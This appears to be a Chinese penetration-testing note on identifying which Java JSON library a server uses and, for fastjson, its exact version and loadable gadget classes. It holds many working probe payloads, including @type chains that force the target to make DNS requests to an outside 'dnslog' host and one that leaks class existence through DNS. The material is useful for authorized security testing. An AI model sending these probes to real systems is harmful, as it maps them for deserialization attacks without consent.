# json框架区分
给定正常对象 User
```java
public class User {
    String username;
    int password;
    float id;
}
```

利用报错信息、回显信息来区分json框架最直接的方式是更改原json数据构造错误语法（比如删去 `"`） ，通过异常信息中的关键字识别。

这种方式需要的最重要的一个前置条件就是报错需要回显，且需要是json框架的报错。比如在实战中遇到一些做了统一错误处理的站点，原本用来判断 jackson 的方式（添加字符破坏的方式），在参数处理时就已经触发Exception，这种情况其实是不好确定的。

## fstjson
1. 浮点精度不丢失
   其他 json 解析库在解析json时都会丢失，但fastjson不会，但是
```json
{"username":"1234","password":1.111111111111111111111111111111111,"id":1.1111111111111111111111111111111111111}
```
2. 响应状态
   如果是fastjson会对@type做出响应
```json
{"@type":"whatever"}
```
3. DNSLOG
   DNSLOG 这种方式可以无回显探测fastjson，是较为高效的一种方法，但不适用于不出网环境，具体探测方式在后文展开
```json
{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
```

## jackson
1. 严格要求与bean对象对齐，可少不能多，因此添加多余kv 报错
```json
{"username":"1234","password":"123","a":1}
```
2. 无法解析单引号 报错
```json
{'username':'1234','password':'123'}
```
3. 无法识别注释符 报错
```json
{"username":"1234","password":"123"}/**/
```

## gson
1. 浮点无法转整数 报错
   向 int 类型的值传浮点数无法解析会报错 NumberFormatException
```json
{"username":"1234","password":1.111111111111111111111111111111111,"id":1}
```
2. 特有解析
   org.json 与 gson 在遇到 # 时都会当注释符处理，可以用来识别这两个框架
```json
#\n{"username":"1234","password":1,"id":1.1}
```
而gson 在不开启 `JsonReader.setLenient(true)` 的情况下（默认未开启），再拼接一个json字符串时会报错，可以用来区分这两个框架
```json
#\n{a:1}\n{\"username\":\"1234\",\"password\":1,\"id\":1.1}
```

## org.json
1. 特有解析
   org.json 打印会调用 toString() 所以可以插入 `\n \r`等字符改变输出，如结合前面的 `#` 再加上 `\r`
```json
#{"username":"\r"}
```


## 举例实测案例
## fastjson
对于某正常登陆接口
![](attachments/Pasted%20image%2020221114152732.png)

添加多余key不报错，排除jackson
![](attachments/Pasted%20image%2020221114152841.png)

寻找另外一个整数值的接口改成浮点数，触发报错，但报错信息与gson预想不一致，还需要判断
![](attachments/Pasted%20image%2020221114153516.png)

拼接特有解析 `#\n{a:1}\n`，在排除gson的同时，通过报错信息得到组件为fastjson 1.2.83
![](attachments/Pasted%20image%2020221114153913.png)

## jackson
![](attachments/Pasted%20image%2020221118102601.png)


# dnslog
这里给出8条fastjson的调用链进行测试，如果存在fastjson框架则会收到 dns 请求，其中`java.net.URL` 在 1.2.24中不会解析

```bash
{"1":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
{"2":{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}}
{"3":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.net.URL","val":"http://dnslog"}}""}}
{"4":{"@type":"java.net.Inet4Address","val":"dnslog"}}
{"5":{"@type":"java.net.Inet6Address","val":"dnslog"}}
{"5":{"@type":"java.net.InetAddress","val":"dnslog"}}
{"6":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}
{"7":{{"@type":"java.net.URL","val":"http://dnslog"}:0}
```

在 dnslog 域名被禁用的情况下，有回显也可以用一些正常域名测试是否存在DNS配置或出网
```json
{
"a":{"@type":"java.net.InetAddress",
"val":"www.baidu.com"
}}
```

# fastjson版本探测
## 精确版本号1
有报错回显的情况下，返回精确版本号
```json
{
  "@type": "java.lang.AutoCloseable"
```

![](attachments/Pasted%20image%2020221118153949.png)

## 精确版本号2
对于存在 FastJsonHttpMessageConverter 配置的解析，通常指定了key值或json结构，可通过添加`[]`等方式破坏既定结构，实例：
```json
[
{
  "@type": "whatever"
}
]
```
![](attachments/Pasted%20image%2020221124153332.png)
## dnslog
在没有回显的情况下，如果可以出网就要考虑dnslog了
前文提到1.2.24版本不会解析 `java.net.URL`，而在之前的研究中，1.2.47、1.2.68、1.2.80是漏洞的三个里程碑版本，通过`java.lang.Class`、`java.lang.AutoCloseable`、`java.lang.Exception` 来构造dns请求可以准确识别


payload向下兼容版本，
### 1.2.47
```json
[
  {
    "@type": "java.lang.Class",
    "val": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "dnslog"
  }
}
]
```


### 1.2.68
```json
[
  {
    "@type": "java.lang.AutoCloseable",
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.io.ByteArrayOutputStream"
  },
  {
    "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "dnslog"
  }
}
]
```

### 1.2.80
在68和80都只会接收到第一个dnslog请求，83会收到第二个请求
```json
[
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "x": {
      "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "1.dnslog.cn"
  }
}
},
  {
    "@type": "java.lang.Exception",
    "@type": "com.alibaba.fastjson.JSONException",
    "message": {
      "@type": "java.net.InetSocketAddress"
  {
    "address":,
    "val": "2.dnslog.cn"
  }
}
}
]
```



# 利用链探测
## Character 报错回显
探测到存在的类时将 Class 强转为 Char 导致报错回显
```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "com.fastjsoncheck.User"
}
}
```
![](attachments/Pasted%20image%2020221118171808.png)

## Class回显
当类存在时将返回一个类实例
```json
{
  "p": {
    "@type": "java.lang.Class",
    "val": "com.fastjsoncheck.User"
  }
}
```

## dnslog外带
该方式有限制，在mac环境下可以ping带 `{}` 的域名，Linux、win会报错
```json
{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","country":"dnslog","language":{"@type":"java.lang.String"{"x":{"@type":"java.lang.Class","val":"org.python.antlr.ParseException"}}}}}
```

